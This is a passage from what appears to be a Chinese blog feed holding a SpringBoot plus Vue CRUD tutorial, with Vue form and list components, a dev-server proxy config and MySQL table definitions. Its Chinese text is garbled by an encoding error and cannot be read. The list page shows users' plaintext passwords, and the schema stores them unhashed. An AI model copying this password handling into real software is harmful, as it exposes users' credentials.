class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;el-card class=&quot;person-card&quot;&gt;<br>      &lt;h2&gt;personè¡¨(æ’å…¥æˆ–æ›´æ–°)&lt;/h2&gt;<br>      &lt;el-form<br>        :model=&quot;ruleForm&quot;<br>        status-icon<br>        :rules=&quot;rules&quot;<br>        ref=&quot;ruleFormRef&quot;<br>        label-position=&quot;left&quot;<br>        label-width=&quot;80px&quot;<br>        class=&quot;demo-ruleForm&quot;<br>      &gt;<br>        &lt;el-form-item label=&quot;username&quot; prop=&quot;username&quot;&gt;<br>          &lt;el-input v-model=&quot;ruleForm.username&quot;&gt;&lt;/el-input&gt;<br>        &lt;/el-form-item&gt;<br>        &lt;el-form-item label=&quot;name&quot; prop=&quot;name&quot;&gt;<br>          &lt;el-input v-model=&quot;ruleForm.name&quot;&gt;&lt;/el-input&gt;<br>        &lt;/el-form-item&gt;<br>        &lt;el-form-item label=&quot;age&quot; prop=&quot;age&quot;&gt;<br>          &lt;el-input v-model.number=&quot;ruleForm.age&quot;&gt;&lt;/el-input&gt;<br>        &lt;/el-form-item&gt;<br>        &lt;el-form-item label=&quot;teleno&quot; prop=&quot;teleno&quot;&gt;<br>          &lt;el-input v-model=&quot;ruleForm.teleno&quot;&gt;&lt;/el-input&gt;<br>        &lt;/el-form-item&gt;<br>      &lt;/el-form&gt;<br>      &lt;div class=&quot;btnGroup&quot;&gt;<br>        &lt;el-button<br>          type=&quot;primary&quot;<br>          @click=&quot;confirmAdd(&#x27;ruleFormRef&#x27;)&quot;<br>          v-loading=&quot;loading1&quot;<br>          &gt;æäº¤&lt;/el-button<br>        &gt;<br>        &lt;!--        &lt;el-button type=&quot;primary&quot; @click=&quot;submitForm(&#x27;ruleFormRef&#x27;)&quot;&gt;æäº¤&lt;/el-button&gt;--&gt;<br>        &lt;el-button @click=&quot;resetForm(&#x27;ruleFormRef&#x27;)&quot;&gt;é‡ç½®&lt;/el-button&gt;<br>        &lt;router-link to=&quot;/list&quot;&gt;<br>          &lt;el-button style=&quot;margin-left: 10px&quot;&gt;æŸ¥çœ‹&lt;/el-button&gt;<br>        &lt;/router-link&gt;<br>      &lt;/div&gt;<br>    &lt;/el-card&gt;<br>  &lt;/div&gt;<br><br>  &lt;div&gt;<br>    &lt;el-card class=&quot;user-card&quot;&gt;<br>      &lt;h2&gt;userè¡¨(åˆ é™¤)&lt;/h2&gt;<br>      &lt;el-form<br>        :model=&quot;ruleForm&quot;<br>        status-icon<br>        :rules=&quot;rules&quot;<br>        ref=&quot;ruleFormRef2&quot;<br>        label-position=&quot;left&quot;<br>        label-width=&quot;80px&quot;<br>        class=&quot;demo-ruleForm&quot;<br>      &gt;<br>        &lt;el-form-item label=&quot;username&quot; prop=&quot;username2&quot;&gt;<br>          &lt;el-input v-model=&quot;ruleForm.username2&quot;&gt;&lt;/el-input&gt;<br>        &lt;/el-form-item&gt;<br>      &lt;/el-form&gt;<br>      &lt;div class=&quot;btnGroup&quot;&gt;<br>        &lt;el-button<br>          type=&quot;primary&quot;<br>          @click=&quot;confirmDelete(&#x27;ruleFormRef2&#x27;)&quot;<br>          v-loading=&quot;loading2&quot;<br>          &gt;æäº¤&lt;/el-button<br>        &gt;<br>        &lt;el-button @click=&quot;resetForm(&#x27;ruleFormRef2&#x27;)&quot;&gt;é‡ç½®&lt;/el-button&gt;<br>        &lt;router-link to=&quot;/list&quot;&gt;<br>          &lt;el-button style=&quot;margin-left: 10px&quot;&gt;æŸ¥çœ‹&lt;/el-button&gt;<br>        &lt;/router-link&gt;<br>        &lt;!--        &lt;el-button type=&quot;primary&quot; @click=&quot;submitForm(&#x27;ruleForm&#x27;)&quot;&gt;æäº¤&lt;/el-button&gt;--&gt;<br>      &lt;/div&gt;<br>    &lt;/el-card&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import axios from &quot;axios&quot;;<br>export default &#123;<br>  data() &#123;<br>    //å¹´é¾„æ ¼å¼æ£€æŸ¥<br>    const checkAge = (rule, value, callback) =&gt; &#123;<br>      // setTimeout(() =&gt; &#123;<br>      if (!Number.isInteger(value) &amp;&amp; value !== &quot;&quot;) &#123;<br>        callback(new Error(&quot;è¯·è¾“å…¥æ•°å­—&quot;));<br>      &#125; else &#123;<br>        if (value &gt; 150) &#123;<br>          callback(new Error(&quot;æ‚¨ä¹Ÿå¤ªè€äº†å§&quot;));<br>        &#125; else &#123;<br>          callback();<br>        &#125;<br>      &#125;<br>      // &#125;, 1000);<br>    &#125;;<br>    //ç”µè¯æ ¼å¼æ£€æŸ¥<br>    const validateTeleno = (rule, value, callback) =&gt; &#123;<br>      if (value.length &gt; 11) &#123;<br>        callback(new Error(&quot;è¯·è¾“å…¥æ­£ç¡®çš„æ‰‹æœºå·&quot;));<br>      &#125; else &#123;<br>        callback();<br>      &#125;<br>    &#125;;<br>    return &#123;<br>      ruleForm: &#123;<br>        username: &quot;&quot;,<br>        name: &quot;&quot;,<br>        age: &quot;&quot;,<br>        teleno: &quot;&quot;,<br>        username2: &quot;&quot;,<br>      &#125;,<br>      //è®¾è®¡è¾“å…¥æ ¡éªŒè§„åˆ™<br>      rules: &#123;<br>        username: [<br>          &#123; required: true, message: &quot;ç”¨æˆ·åä¸èƒ½ä¸ºç©ºï¼&quot;, trigger: &quot;blur&quot; &#125;,<br>        ],<br>        name: [&#123; required: true, message: &quot;åå­—ä¸èƒ½ä¸ºç©ºï¼&quot;, trigger: &quot;blur&quot; &#125;],<br>        age: [&#123; validator: checkAge, trigger: &quot;blur&quot; &#125;], //é‡‡ç”¨å‰é¢å®šä¹‰çš„æ ¡éªŒè§„åˆ™<br>        teleno: [&#123; validator: validateTeleno, trigger: &quot;blur&quot; &#125;],<br>        username2: [<br>          &#123; required: true, message: &quot;ç”¨æˆ·åä¸èƒ½ä¸ºç©ºï¼&quot;, trigger: &quot;blur&quot; &#125;,<br>        ],<br>      &#125;,<br>      loading1: false, // æ˜¯å¦æ˜¾ç¤ºåŠ è½½åŠ¨ç”»<br>      loading2: false,<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    addData() &#123;<br>      this.loading1 = true;<br>      //2.ä½¿ç”¨axios è¿›è¡Œgetè¯·æ±‚<br>      axios<br>        .post(&quot;/api/person/add&quot;, &#123;<br>          username: this.ruleForm.username,<br>          name: this.ruleForm.name,<br>          age: this.ruleForm.age,<br>          teleno: this.ruleForm.teleno,<br>        &#125;)<br>        .then((res) =&gt; &#123;<br>          //è¯·æ±‚æˆåŠŸçš„å›è°ƒå‡½æ•°<br>          if (res.data.code === &quot;0&quot;) &#123;<br>            this.$message(&#123;<br>              message: res.data.msg,<br>              showClose: true,<br>              type: &quot;success&quot;,<br>            &#125;);<br>          &#125; else &#123;<br>            this.$message(&#123;<br>              message: res.data.msg,<br>              showClose: true,<br>              type: &quot;error&quot;,<br>            &#125;);<br>          &#125;<br>          this.loading1 = false;<br>          console.log(res);<br>        &#125;)<br>        .catch((err) =&gt; &#123;<br>          //è¯·æ±‚å¤±è´¥çš„å›è°ƒå‡½æ•°<br>          console.log(err);<br>        &#125;);<br>    &#125;,<br>    deleteData() &#123;<br>      this.loading2 = true;<br>      //2.ä½¿ç”¨axios è¿›è¡Œgetè¯·æ±‚<br>      console.log(this.ruleForm.username2);<br>      axios<br>        .post(<br>          &quot;/api/user/delete&quot;,<br>          &#123;&#125;,<br>          &#123;<br>            //å¿…é¡»è¦åŠ ä¸­é—´é‚£ä¸ªæ‹¬å·,ä¸ç„¶æ— æ³•å·¥ä½œ<br>            params: &#123;<br>              username: this.ruleForm.username2,<br>            &#125;,<br>          &#125;<br>        )<br>        .then((res) =&gt; &#123;<br>          //è¯·æ±‚æˆåŠŸçš„å›è°ƒå‡½æ•°<br>          if (res.data.code === &quot;0&quot;) &#123;<br>            this.$message(&#123;<br>              message: res.data.msg,<br>              showClose: true,<br>              type: &quot;success&quot;,<br>            &#125;);<br>          &#125; else &#123;<br>            this.$message(&#123;<br>              message: res.data.msg,<br>              showClose: true,<br>              type: &quot;error&quot;,<br>            &#125;);<br>          &#125;<br>          this.loading2 = false;<br>          console.log(res);<br>        &#125;)<br>        .catch((err) =&gt; &#123;<br>          //è¯·æ±‚å¤±è´¥çš„å›è°ƒå‡½æ•°<br>          console.log(err);<br>        &#125;);<br>    &#125;,<br>    resetForm(formName) &#123;<br>      this.$refs[formName].resetFields();<br>      this.loading1 = false;<br>      this.loading2 = false;<br>    &#125;,<br>    //æ·»åŠ æ ¼å¼æ ¡éªŒå’Œæäº¤ç¡®å®š<br>    confirmAdd(formName) &#123;<br>      this.$refs[formName].validate((valid) =&gt; &#123;<br>        if (valid) &#123;<br>          this.$confirm(<br>            &quot;æ˜¯å¦ç¡®è®¤æ·»åŠ ç”¨æˆ·:&quot; + this.ruleForm.username + &quot;  ?&quot;,<br>            &quot;æç¤º&quot;,<br>            &#123;<br>              confirmButtonText: &quot;ç¡®å®š&quot;,<br>              cancelButtonText: &quot;å–æ¶ˆ&quot;,<br>              type: &quot;warning&quot;,<br>            &#125;<br>          )<br>            .then(() =&gt; &#123;<br>              this.addData();<br>            &#125;)<br>            .catch(() =&gt; &#123;<br>              this.$message(&#123;<br>                type: &quot;info&quot;,<br>                message: &quot;å·²å–æ¶ˆæ·»åŠ ç”¨æˆ·&quot;,<br>              &#125;);<br>            &#125;);<br>        &#125; else &#123;<br>          console.log(&quot;error submit!&quot;);<br>          return false;<br>        &#125;<br>      &#125;);<br>    &#125;,<br>    //æ·»åŠ æ ¼å¼æ ¡éªŒå’Œæäº¤ç¡®å®š<br>    confirmDelete(formName) &#123;<br>      this.$refs[formName].validate((valid) =&gt; &#123;<br>        if (valid) &#123;<br>          this.$confirm(<br>            &quot;æ˜¯å¦ç¡®è®¤åˆ é™¤ç”¨æˆ·:&quot; + this.ruleForm.username2 + &quot;  ?&quot;,<br>            &quot;æç¤º&quot;,<br>            &#123;<br>              confirmButtonText: &quot;ç¡®å®š&quot;,<br>              cancelButtonText: &quot;å–æ¶ˆ&quot;,<br>              type: &quot;warning&quot;,<br>            &#125;<br>          )<br>            .then(() =&gt; &#123;<br>              this.deleteData();<br>            &#125;)<br>            .catch(() =&gt; &#123;<br>              this.$message(&#123;<br>                type: &quot;info&quot;,<br>                message: &quot;å·²å–æ¶ˆåˆ é™¤ç”¨æˆ·&quot;,<br>              &#125;);<br>            &#125;);<br>        &#125; else &#123;<br>          console.log(&quot;error submit!&quot;);<br>          return false;<br>        &#125;<br>      &#125;);<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;/script&gt;<br><br>&lt;style scoped&gt;<br>/* è®¾ç½®personé¢æ¿å±…ä¸­ */<br>.person-card &#123;<br>  margin: auto auto 20px auto;<br>  width: 400px;<br>&#125;<br>/* è®¾ç½®personé¢æ¿ä¸­çš„è¡¨å•å±…ä¸­ */<br>.user-card &#123;<br>  margin: auto auto 20px auto;<br>  width: 400px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></div></td></tr></table></figure><h3 id="5è®¾è®¡listpage"><a class="markdownIt-Anchor" href="#5è®¾è®¡listpage"></a> 5.è®¾è®¡listPage</h3><p>è¯¥ç»„ä»¶æ˜¯ç»“æœå±•ç¤ºç•Œé¢</p><p>æœ€ç»ˆæ•ˆæœå¦‚å›¾ï¼š</p><p><img src="/posts/3de7737d/image-20220418163131246.png" alt="image-20220418163131246"></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;router-link to=&quot;/index&quot;&gt;<br>    &lt;el-button style=&quot;margin: 100px auto 20px auto&quot;&gt;è¿”å›ä¸»é¡µ&lt;/el-button&gt;<br>  &lt;/router-link&gt;<br>  &lt;div&gt;<br>    &lt;el-card class=&quot;user-card&quot;&gt;<br>      &lt;p&gt;Userè¡¨&lt;/p&gt;<br>      &lt;el-table<br>          :data=&quot;tableDataUser&quot;<br>          style=&quot;width: 100%&quot;<br>          max-height=&quot;250&quot;<br>          border&gt;<br>        &lt;el-table-column prop=&quot;username&quot; label=&quot;username&quot; width=&quot;360&quot; /&gt;<br>        &lt;el-table-column prop=&quot;pass&quot; label=&quot;password&quot; width=&quot;360&quot; /&gt;<br>      &lt;/el-table&gt;<br>    &lt;/el-card&gt;<br>  &lt;/div&gt;<br><br><br>  &lt;div&gt;<br>    &lt;el-card class=&quot;person-card&quot;&gt;<br>      &lt;p&gt;Personè¡¨&lt;/p&gt;<br>      &lt;el-table<br>          :data=&quot;tableDataPerson&quot;<br>          style=&quot;width: 100%&quot;<br>          max-height=&quot;250&quot;<br>          border&gt;<br>        &lt;el-table-column prop=&quot;username&quot; label=&quot;username&quot; width=&quot;180&quot; /&gt;<br>        &lt;el-table-column prop=&quot;name&quot; label=&quot;name&quot; width=&quot;180&quot; /&gt;<br>        &lt;el-table-column prop=&quot;age&quot; label=&quot;age&quot; width=&quot;180&quot;/&gt;<br>        &lt;el-table-column prop=&quot;teleno&quot; label=&quot;teleno&quot; width=&quot;180&quot;/&gt;<br>      &lt;/el-table&gt;<br>    &lt;/el-card&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import axios from &quot;axios&quot;;<br><br>export default &#123;<br>  data() &#123;<br>    return &#123;<br>      tableDataPerson: [],<br>      tableDataUser:[]<br>    &#125;<br>  &#125;,<br>  methods: &#123;<br>    getPersonData() &#123;<br>      //2.ä½¿ç”¨axios è¿›è¡Œgetè¯·æ±‚<br>      axios<br>          .get(&quot;/api/person/list&quot;)<br>          .then((res) =&gt; &#123;<br>            //è¯·æ±‚æˆåŠŸçš„å›è°ƒå‡½æ•°<br>            this.$message(&#123;<br>              message: res.data.msg,<br>              showClose: true,<br>              type: &quot;success&quot;,<br>            &#125;);<br>            this.tableDataPerson=res.data.data<br>            for (const p in this.tableDataPerson) &#123;//éå†jsonæ•°ç»„,å°†ä¸º0çš„ageç½®ä¸ºnull<br>              if(this.tableDataPerson[p].age===0)this.tableDataPerson[p].age =null;<br>            &#125;<br>            console.log(res);<br>          &#125;)<br>          .catch((err) =&gt; &#123;<br>            //è¯·æ±‚å¤±è´¥çš„å›è°ƒå‡½æ•°<br>            console.log(err);<br>          &#125;);<br>    &#125;,<br>    getUserData() &#123;<br>      //2.ä½¿ç”¨axios è¿›è¡Œgetè¯·æ±‚<br>      axios<br>          .get(&quot;/api/user/list&quot;)<br>          .then((res) =&gt; &#123;<br>            //è¯·æ±‚æˆåŠŸçš„å›è°ƒå‡½æ•°<br>            this.$message(&#123;<br>              message: res.data.msg,<br>              showClose: true,<br>              type: &quot;success&quot;,<br>            &#125;);<br>            this.tableDataUser=res.data.data<br>            this.loading= false ;<br>            console.log(res);<br>          &#125;)<br>          .catch((err) =&gt; &#123;<br>            //è¯·æ±‚å¤±è´¥çš„å›è°ƒå‡½æ•°<br>            console.log(err);<br>          &#125;);<br>    &#125;,<br>  &#125;,<br>  mounted:function()&#123;<br>    this.getPersonData();<br>    this.getUserData()<br>    console.log(&quot;æŸ¥çœ‹æˆåŠŸ&quot;);<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style scoped&gt;<br>/* è®¾ç½®é¢æ¿å±…ä¸­ */<br>.user-card &#123;<br>  margin: auto auto 20px auto;<br>  width: 720px;<br>&#125;<br>/* è®¾ç½®é¢æ¿ä¸­çš„è¡¨å•å±…ä¸­ */<br>.person-card &#123;<br>  margin: auto auto 20px auto;<br>  width: 720px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></div></td></tr></table></figure><h3 id="6é…ç½®ä»£ç†"><a class="markdownIt-Anchor" href="#6é…ç½®ä»£ç†"></a> 6.é…ç½®ä»£ç†</h3><blockquote><p>åœ¨æ­£å¼å¼€å§‹å†™ç™»å½•æ³¨å†Œä¸åç«¯çš„äº¤äº’ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆåœ¨å‰ç«¯å¤„ç†ä¸€ä¸‹è·¨åŸŸé—®é¢˜ã€‚è·¨åŸŸé—®é¢˜å¯ä»¥ç®€å•ç†è§£æˆå¦‚æœä½ çš„å‰ç«¯é¡¹ç›®çš„<strong>IPåœ°å€</strong>å’Œ<strong>ç«¯å£å·</strong>å’Œåç«¯çš„<strong>IPåœ°å€</strong>å’Œ<strong>ç«¯å£å·</strong>ä¸ä¸€æ ·ï¼Œå°±ä¼šå¯¼è‡´å‰ç«¯æ— æ³•è·å–åˆ°æ•°æ®ï¼Œè¿™æ˜¯ä¸€ä¸ªè§„å®šã€‚è€Œåœ¨å‰åç«¯åˆ†ç¦»å¼€å‘çš„é¡¹ç›®ä¸­ï¼Œå‰åç«¯é¡¹ç›®çš„ç«¯å£å·ä¸€èˆ¬éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬è¿™ä¸ªé¡¹ç›®çš„å‰ç«¯ç«¯å£å·æ˜¯ 8080ï¼Œåç«¯ç«¯å£å·æ˜¯ 8081ï¼Œæ‰€ä»¥ä¸€å®šä¼šé€ æˆè·¨åŸŸè®¿é—®çš„é—®é¢˜ï¼Œè·¨åŸŸè®¿é—®çš„é—®é¢˜å¯ä»¥åœ¨å‰ç«¯è§£å†³ä¹Ÿå¯ä»¥åœ¨åç«¯è§£å†³ï¼Œå‰ç«¯ä¸€èˆ¬é‡‡ç”¨ä»£ç†æœåŠ¡å™¨çš„æ–¹å¼ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬ä¹Ÿé€šè¿‡é…ç½®ä»£ç†æœåŠ¡å™¨çš„æ–¹æ³•æ¥å¤„ç†è·¨åŸŸé—®é¢˜ã€‚</p></blockquote><p>ä¿®æ”¹vue.config.jsæ–‡ä»¶å¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123; defineConfig &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@vue/cli-service&#x27;</span>)<br><span class="hljs-built_in">module</span>.exports = defineConfig(&#123;<br>  <span class="hljs-attr">lintOnSave</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// å…³é—­è¯­æ³•æ£€æµ‹</span><br>  <span class="hljs-attr">transpileDependencies</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">devServer</span>: &#123;<br>    <span class="hljs-comment">// ä»£ç†æœåŠ¡å™¨å¯ä»¥å°†è·¯ç”±ä¸­çš„æŒ‡å®šå‰ç¼€è½¬å‘åˆ°æŒ‡å®šçš„åç«¯æœåŠ¡å™¨ä¸­</span><br>    <span class="hljs-attr">proxy</span>: &#123;<br>      <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;<br>        <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:8081/&#x27;</span>,<br>        <span class="hljs-attr">ws</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// æ˜¯å¦å¯ç”¨websockets</span><br>        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,  <span class="hljs-comment">// ä»£ç†æ—¶æ˜¯å¦æ›´æ”¹host</span><br>        <span class="hljs-attr">pathRewrite</span>: &#123;<br>          <span class="hljs-string">&#x27;^/api&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">//è¿™é‡Œç†è§£æˆç”¨&#x27;/api&#x27;ä»£æ›¿targeté‡Œé¢çš„åœ°å€</span><br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;,<br>&#125;)<br></code></pre></div></td></tr></table></figure><p>ä¿®æ”¹å®Œè¿™ä¸ªé…ç½®éœ€è¦é‡å¯ä¸‹å‰ç«¯é¡¹ç›®æ‰ä¼šç”Ÿæ•ˆ</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">npm run serve<br></code></pre></div></td></tr></table></figure><p>ç»“åˆåç«¯é¡¹ç›®ï¼Œä¸å‡ºæ„å¤–çš„è¯ï¼Œå°±å¯ä»¥å®ç°åœ¨å‰ç«¯æ“ä½œæ•°æ®åº“äº†ï¼Œè¿™ä¸ªå‰åç«¯åˆ†ç¦»çš„é¡¹ç›®å°±å®Œæˆäº†ã€‚</p><video src="vueé¡¹ç›®å…¥é—¨(è°ƒç”¨spring bootæ¥å£)/QQå½•å±20220418165319.mp4"><p>å‚è€ƒï¼š</p><p><a href="https://www.makerhu.com/posts/78e35d03/">Vue å®ç°ç™»å½•æ³¨å†ŒåŠŸèƒ½ï¼ˆå‰åç«¯åˆ†ç¦»å®Œæ•´æ¡ˆä¾‹ï¼‰</a></p><p>å…³äºvueçš„æ•™ç¨‹ï¼Œ<a href="https://cli.vuejs.org/zh/">vueå®˜ç½‘</a>æœ‰è¯¦ç»†çš„æ•™ç¨‹</p></video>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot+Vueå‰åç«¯åˆ†ç¦»é¡¹ç›®ä¹‹åç«¯SpringBootéƒ¨åˆ†</title>
    <link href="/posts/c43b2e6b/"/>
    <url>/posts/c43b2e6b/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡ç« å¯¹SpringBootå¼€å‘åç«¯é¡¹ç›®ç»“æ„åšäº†ç®€å•ä»‹ç»ï¼Œå¹¶å®ç°äº†ç”¨SpringBoot+MySQLå®ç°æ“ä½œæ•°æ®åº“å¢åˆ æ”¹æŸ¥çš„åç«¯åŠŸèƒ½ï¼Œä¸æœ¬åšå®¢çš„å¦ä¸€ç¯‡æ–‡ç«  <a href="https://www.makerhu.com/posts/78e35d03/">SpringBoot+Vueå‰åç«¯åˆ†ç¦»é¡¹ç›®ä¹‹å‰ç«¯vueéƒ¨åˆ†</a>å…±åŒç»„æˆäº†å‰åç«¯åˆ†ç¦»é¡¹ç›®çš„æ•´ä½“ã€‚</p></blockquote><h2 id="ä¸€-ç¯å¢ƒå‡†å¤‡"><a class="markdownIt-Anchor" href="#ä¸€-ç¯å¢ƒå‡†å¤‡"></a> ä¸€ã€ç¯å¢ƒå‡†å¤‡</h2><p>ç¼–è¾‘å™¨ï¼šIDEA</p><p>æ•°æ®åº“ï¼šmysql</p><p>æ¥å£æµ‹è¯•å·¥å…·ï¼špostman</p><h2 id="äºŒ-é¡¹ç›®åˆ›å»º"><a class="markdownIt-Anchor" href="#äºŒ-é¡¹ç›®åˆ›å»º"></a> äºŒã€é¡¹ç›®åˆ›å»º</h2><h3 id="æ•°æ®åº“åˆ›å»º"><a class="markdownIt-Anchor" href="#æ•°æ®åº“åˆ›å»º"></a> æ•°æ®åº“åˆ›å»º</h3><p>æœ¬å®éªŒæ•°æ®åº“åŸºäºè¯¾ç¨‹å®éªŒ3çš„åŸºç¡€ç”¨javaåˆ›å»ºï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åŸºäºsqlåˆ›å»ºã€‚</p><p>é¦–å…ˆåˆ›å»ºæ•°æ®åº“test,ç„¶ååˆ›å»ºä¸¤ä¸ªè¡¨</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">create table person(<br>    username varchar(10) not null,<br>    name varchar(20) not null,<br>    age int,<br>    teleno char(11),<br>    primary key ( name )<br>);<br>create table users(<br>    username varchar(10) not null,<br>    pass varchar(8) not null,<br>    primary key ( username )<br>);<br></code></pre></div></td></tr></table></figure><p>åœ¨ideaé¡¹ç›®æ–°å»ºé¡¹ç›®ä¸­é€‰æ‹©spring initializr</p><p>æŒ‰ä¸‹å›¾é€‰æ‹©</p><p><img src="/posts/c43b2e6b/image-20220418113029086.png" alt="image-20220418113029086"></p><p>å®‰è£…ä¸‹é¢ä¸‰ä¸ªä¾èµ–:</p><p>å…¶ä¸­spring data JDBCä¾èµ–æä¾›äº†JDCBtemplateçš„æ¥å£ï¼Œå¯ä»¥è®©æˆ‘ä»¬ç›´æ¥é€šè¿‡æ¥å£æ“ä½œæ•°æ®åº“</p><p>ç‚¹å‡»å®Œæˆå°±åˆ›å»ºå¥½äº†ä¸€ä¸ªé¡¹ç›®</p><p><img src="/posts/c43b2e6b/image-20220418113151194.png" alt="image-20220418113151194"></p><p>åˆå§‹é¡¹ç›®ç»“æ„å¦‚ä¸‹</p><p>å…¶ä¸­Ex4springApplicationå°±æ˜¯æˆ‘ä»¬çš„ä¸»æ–‡ä»¶ï¼Œé€šè¿‡è¿™ä¸ªæ¥å¯åŠ¨æ•´ä¸ªæ–‡ä»¶</p><p><img src="/posts/c43b2e6b/image-20220418113827792.png" alt="image-20220418113827792"></p><p>è¿™æ ·è¿˜ä¸èƒ½æˆåŠŸå¯åŠ¨ï¼Œè¿˜éœ€è¦é…ç½®ä¸€ä¸‹æ•°æ®åº“</p><p><img src="/posts/c43b2e6b/image-20220418130249742.png" alt="image-20220418130249742"></p><p>ç„¶åç‚¹å‡»æ„å»ºå°±å¯ä»¥çœ‹åˆ°é¡¹ç›®æˆåŠŸå¯åŠ¨äº†</p><p><img src="/posts/c43b2e6b/image-20220418130326779.png" alt="image-20220418130326779"></p><h2 id="ä¸‰-é¡¹ç›®ç»“æ„"><a class="markdownIt-Anchor" href="#ä¸‰-é¡¹ç›®ç»“æ„"></a> ä¸‰ã€é¡¹ç›®ç»“æ„</h2><p>ä¸‹é¢å±•ç¤ºä¸€ä¸‹æœ€ç»ˆé¡¹ç›®çš„ç»“æ„</p><p><img src="/posts/c43b2e6b/image-20220418124653232.png" alt="image-20220418124653232"></p><ul><li><p>æ•°æ®æŒä¹…å±‚</p><p>ç›®çš„æ˜¯åœ¨javaå¯¹è±¡ä¸æ•°æ®åº“ä¹‹é—´å»ºç«‹æ˜ å°„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒçš„ä½œç”¨æ˜¯å°†æŸä¸€ä¸ªJavaç±»å¯¹åº”åˆ°æ•°æ®åº“ä¸­çš„ä¸€å¼ 